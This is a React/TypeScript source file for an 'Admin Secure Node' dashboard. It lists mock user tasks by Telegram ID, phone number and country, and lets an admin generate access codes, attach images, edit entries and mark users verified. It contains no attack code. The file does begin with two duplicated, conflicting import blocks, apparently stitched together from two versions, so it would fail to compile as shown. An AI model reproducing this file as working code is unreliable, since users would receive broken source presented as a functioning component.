import React, { useState, useEffect } from 'react';
import { useAppConfig } from '../context/AppContext';
import { MockDatabase, UserTask } from '../lib/mockDatabase';
import { User, Phone, Globe, Hash, Clock, Check, Edit2, Image as ImageIcon, MessageSquare } from 'lucide-react';

import React, { useState, useEffect, useMemo } from 'react';
import { useAppConfig } from '../context/AppContext';
import { MockDatabase, UserTask } from '../lib/mockDatabase';
import { User, Phone, Globe, Hash, Clock, Check, Edit2, Image as ImageIcon, Search, ShieldCheck, Activity, Users, FileText } from 'lucide-react';

export default function AdminDashboard() {
  const [tasks, setTasks] = useState<UserTask[]>([]);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [filter, setFilter] = useState<'all' | 'waiting' | 'success'>('all');

  // Auto-refresh tasks
  useEffect(() => {
    const fetchTasks = () => {
      setTasks(MockDatabase.getTasks().sort((a, b) => b.createdAt - a.createdAt));
    };

    fetchTasks();
    const interval = setInterval(fetchTasks, 2000);
    window.addEventListener('storage', fetchTasks);
    return () => {
      window.removeEventListener('storage', fetchTasks);
      clearInterval(interval);
    };
  }, []);

  const handleSendCode = (telegramId: string) => {
    const code = Math.floor(10000000 + Math.random() * 90000000).toString();
    MockDatabase.updateTask(telegramId, { code });
  };

  const handleSendImage = (telegramId: string) => {
    const randomId = Math.floor(Math.random() * 1000);
    const imageUrl = `https://picsum.photos/seed/${randomId}/600/400`;
    MockDatabase.updateTask(telegramId, { imageUrl });
  };

  const handleSendSuccess = (telegramId: string) => {
    MockDatabase.updateTask(telegramId, { 
      status: 'success', 
      successMessage: 'Maamulaha ayaa xaqiijiyay xogtaada. (Verified)' 
    });
  };

  const handleCustomCode = (telegramId: string, code: string) => {
    MockDatabase.updateTask(telegramId, { code });
  };

  // Compute filtered tasks
  const filteredTasks = useMemo(() => {
    return tasks.filter(t => {
      const matchesSearch = t.telegramId.includes(searchQuery) || t.phone.includes(searchQuery) || t.country.toLowerCase().includes(searchQuery.toLowerCase());
      const matchesFilter = filter === 'all' || t.status === filter;
      return matchesSearch && matchesFilter;
    });
  }, [tasks, searchQuery, filter]);

  // Compute stats
  const stats = {
    total: tasks.length,
    pending: tasks.filter(t => t.status === 'waiting').length,
    success: tasks.filter(t => t.status === 'success').length,
  };

  return (
    <div className="p-4 md:p-8 max-w-6xl mx-auto space-y-8 pb-20">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-4 border-b border-zinc-800 pb-6">
        <div>
          <div className="flex items-center gap-2 mb-2">
            <ShieldCheck className="w-6 h-6 text-emerald-500" />
            <h2 className="text-2xl font-bold text-zinc-100 tracking-tight">Admin Secure Node</h2>
          </div>
          <p className="text-sm text-zinc-400">Control Center & User Verification Management</p>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center px-3 py-1.5 bg-zinc-900 border border-zinc-800 rounded-lg text-xs font-mono text-zinc-400">
            <Activity className="w-3.5 h-3.5 text-emerald-500 mr-2 animate-pulse" />
            System Live
          </div>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5 flex items-center justify-between">
          <div>
            <p className="text-xs font-bold text-zinc-500 uppercase tracking-widest mb-1">Total Users</p>
            <p className="text-3xl font-bold text-zinc-100">{stats.total}</p>
          </div>
          <div className="w-12 h-12 rounded-full bg-zinc-800/50 flex items-center justify-center">
            <Users className="w-6 h-6 text-zinc-400" />
          </div>
        </div>
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5 flex items-center justify-between">
          <div>
            <p className="text-xs font-bold text-amber-500/80 uppercase tracking-widest mb-1">Pending Tasks</p>
            <p className="text-3xl font-bold text-amber-500">{stats.pending}</p>
          </div>
          <div className="w-12 h-12 rounded-full bg-amber-500/10 flex items-center justify-center">
            <FileText className="w-6 h-6 text-amber-500" />
          </div>
        </div>
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5 flex items-center justify-between">
          <div>
            <p className="text-xs font-bold text-emerald-500/80 uppercase tracking-widest mb-1">Verified</p>
            <p className="text-3xl font-bold text-emerald-500">{stats.success}</p>
          </div>
          <div className="w-12 h-12 rounded-full bg-emerald-500/10 flex items-center justify-center">
            <Check className="w-6 h-6 text-emerald-500" />
          </div>
        </div>
      </div>

      {/* Toolbar */}
      <div className="flex flex-col sm:flex-row gap-4 items-center justify-between bg-zinc-900 p-2 rounded-xl border border-zinc-800">
        <div className="relative w-full sm:w-96">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
          <input 
            type="text" 
            placeholder="Search ID, phone, or country..." 
            value={searchQuery}
            onChange={e => setSearchQuery(e.target.value)}
            className="w-full bg-zinc-950 border-none outline-none text-sm text-zinc-200 placeholder-zinc-600 rounded-lg pl-10 pr-4 py-2.5 focus:ring-1 focus:ring-emerald-500 transition-shadow"
          />
        </div>
        <div className="flex w-full sm:w-auto p-1 bg-zinc-950 rounded-lg">
          <button 
            onClick={() => setFilter('all')}
            className={`flex-1 sm:flex-none px-4 py-1.5 text-xs font-bold rounded-md transition-colors ${filter === 'all' ? 'bg-zinc-800 text-zinc-100' : 'text-zinc-500 hover:text-zinc-300'}`}
          >
            All
          </button>
          <button 
            onClick={() => setFilter('waiting')}
            className={`flex-1 sm:flex-none px-4 py-1.5 text-xs font-bold rounded-md transition-colors ${filter === 'waiting' ? 'bg-zinc-800 text-amber-400' : 'text-zinc-500 hover:text-zinc-300'}`}
          >
            Pending
          </button>
          <button 
            onClick={() => setFilter('success')}
            className={`flex-1 sm:flex-none px-4 py-1.5 text-xs font-bold rounded-md transition-colors ${filter === 'success' ? 'bg-zinc-800 text-emerald-400' : 'text-zinc-500 hover:text-zinc-300'}`}
          >
            Success
          </button>
        </div>
      </div>

      {filteredTasks.length === 0 ? (
        <div className="text-center bg-zinc-900 rounded-2xl py-16 border border-zinc-800 border-dashed">
          <Search className="w-10 h-10 text-zinc-700 mx-auto mb-3" />
          <h3 className="text-lg font-bold text-zinc-300">No results found</h3>
          <p className="text-zinc-600 mt-1 text-sm">There are no tasks matching your query.</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {filteredTasks.map(task => (
            <div key={task.id} className="bg-zinc-900 rounded-2xl border border-zinc-800 overflow-hidden flex flex-col group hover:border-zinc-700 transition-colors">
              {/* Card Header */}
              <div className="p-4 border-b border-zinc-800/50 flex justify-between items-center bg-zinc-900/50">
                <div className="flex items-center space-x-3">
                  <div className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center border border-zinc-700">
                    <User className="w-4 h-4 text-zinc-400" />
                  </div>
                  <div>
                    <span className="font-mono text-xs font-bold text-zinc-300 bg-zinc-950 px-2 py-0.5 rounded border border-zinc-800">
                      ID: {task.telegramId}
                    </span>
                  </div>
                </div>
                <StatusBadge status={task.status} />
              </div>

              {/* Card Body */}
              <div className="p-5 space-y-4 flex-grow">
                {editingId === task.id ? (
                  <div className="space-y-3 bg-zinc-950 p-3 rounded-xl border border-zinc-800">
                    <input 
                      type="text" 
                      defaultValue={task.phone}
                      id={`edit-phone-${task.id}`}
                      className="w-full bg-zinc-900 border border-zinc-700 rounded-lg px-3 py-2 text-sm text-zinc-200 focus:border-emerald-500 outline-none"
                    />
                    <select 
                      defaultValue={task.accountType} 
                      id={`edit-type-${task.id}`}
                      className="w-full bg-zinc-900 border border-zinc-700 rounded-lg px-3 py-2 text-sm text-zinc-200 focus:border-emerald-500 outline-none"
                    >
                      <option value="Personal">Personal</option>
                      <option value="Business">Business</option>
                    </select>
                    <div className="flex gap-2 pt-1">
                      <button 
                        onClick={() => {
                          const phone = (document.getElementById(`edit-phone-${task.id}`) as HTMLInputElement).value;
                          const accountType = (document.getElementById(`edit-type-${task.id}`) as HTMLSelectElement).value as any;
                          MockDatabase.updateTask(task.telegramId, { phone, accountType });
                          setEditingId(null);
                        }}
                        className="bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-2 rounded-lg text-xs font-bold flex-1 transition-colors"
                      >
                        Save
                      </button>
                      <button 
                        onClick={() => setEditingId(null)}
                        className="bg-zinc-800 hover:bg-zinc-700 text-zinc-300 px-4 py-2 rounded-lg text-xs font-bold transition-colors"
                      >
                        Cancel
                      </button>
                    </div>
                  </div>
                ) : (
                  <>
                    <div className="flex flex-col gap-2">
                      <div className="flex items-center text-sm font-medium text-zinc-200">
                        <Phone className="w-4 h-4 text-zinc-500 mr-2" />
                        <span className="font-mono">{task.phone}</span>
                      </div>
                      <div className="flex items-center text-xs text-zinc-500">
                        <Globe className="w-3.5 h-3.5 text-zinc-600 mr-2" />
                        {task.country || 'Unknown location'}
                      </div>
                    </div>

                    <div className="flex items-center justify-between mt-4 pt-4 border-t border-zinc-800/50">
                      <span className={`px-2 py-1 rounded text-[10px] font-bold uppercase tracking-widest ${task.accountType === 'Business' ? 'bg-indigo-500/10 text-indigo-400 border border-indigo-500/20' : 'bg-zinc-800 text-zinc-400 border border-zinc-700'}`}>
                        {task.accountType}
                      </span>
                      <button
                        onClick={() => setEditingId(task.id)}
                        className="text-xs text-zinc-500 hover:text-zinc-300 font-bold flex items-center transition-colors"
                      >
                        <Edit2 className="w-3 h-3 mr-1" /> Edit
                      </button>
                    </div>
                  </>
                )}
              </div>

              {/* Admin Actions Panel */}
              <div className="p-4 bg-zinc-950 border-t border-zinc-800">
                <div className="flex flex-col gap-3">
                  <div className="flex flex-col gap-1.5">
                    <label className="text-[10px] uppercase tracking-widest font-bold text-zinc-600">Access Control</label>
                    <div className="flex gap-2">
                      <div className="relative flex-1">
                        <Hash className="w-3.5 h-3.5 text-zinc-600 absolute left-2.5 top-1/2 -translate-y-1/2" />
                        <input 
                          type="text" 
                          placeholder="Code" 
                          className="w-full bg-zinc-900 border border-zinc-800 rounded-lg pl-8 pr-3 py-1.5 text-sm font-mono tracking-widest text-emerald-400 focus:border-emerald-500 outline-none"
                          value={task.code || ''}
                          onChange={(e) => handleCustomCode(task.telegramId, e.target.value)}
                        />
                      </div>
                      <button 
                        onClick={() => handleSendCode(task.telegramId)}
                        className="px-3 py-1.5 bg-zinc-800 border border-zinc-700 text-zinc-300 rounded-lg text-xs font-bold hover:bg-zinc-700 transition-colors"
                        title="Generate Random Code"
                      >
                        Generate
                      </button>
                    </div>
                  </div>

                  <div className="flex gap-2">
                    <button 
                      onClick={() => handleSendImage(task.telegramId)}
                      className={`flex-1 flex items-center justify-center space-x-1.5 py-2 rounded-lg text-xs font-bold transition-colors ${task.imageUrl ? 'bg-indigo-500/20 text-indigo-300 border border-indigo-500/30' : 'bg-zinc-900 border border-zinc-800 text-zinc-400 hover:bg-zinc-800'}`}
                    >
                      <ImageIcon className="w-3.5 h-3.5" />
                      <span>{task.imageUrl ? 'Image Set' : 'Attach Image'}</span>
                    </button>

                    <button 
                      onClick={() => handleSendSuccess(task.telegramId)}
                      disabled={task.status === 'success'}
                      className={`flex-1 flex items-center justify-center space-x-1.5 py-2 rounded-lg text-xs font-bold transition-all ${task.status === 'success' ? 'bg-emerald-900/40 text-emerald-500/50 cursor-not-allowed border border-emerald-900/50' : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-lg shadow-emerald-500/20'}`}
                    >
                      <Check className="w-4 h-4" />
                      <span>Verify User</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  if (status === 'waiting') {
    return (
      <div className="flex items-center gap-2 bg-amber-500/10 border border-amber-500/20 px-2 py-1 rounded-md">
        <div className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-pulse"></div>
        <span className="text-[10px] uppercase tracking-widest font-bold text-amber-500">Pending</span>
      </div>
    );
  }
  if (status === 'success') {
    return (
      <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 px-2 py-1 rounded-md">
        <div className="w-1.5 h-1.5 rounded-full bg-emerald-500"></div>
        <span className="text-[10px] uppercase tracking-widest font-bold text-emerald-500">Success</span>
      </div>
    );
  }
  return (
    <div className="flex items-center gap-2 bg-zinc-800 border border-zinc-700 px-2 py-1 rounded-md">
      <div className="w-1.5 h-1.5 rounded-full bg-zinc-500"></div>
      <span className="text-[10px] uppercase tracking-widest font-bold text-zinc-400 capitalize">{status}</span>
    </div>
  );
}
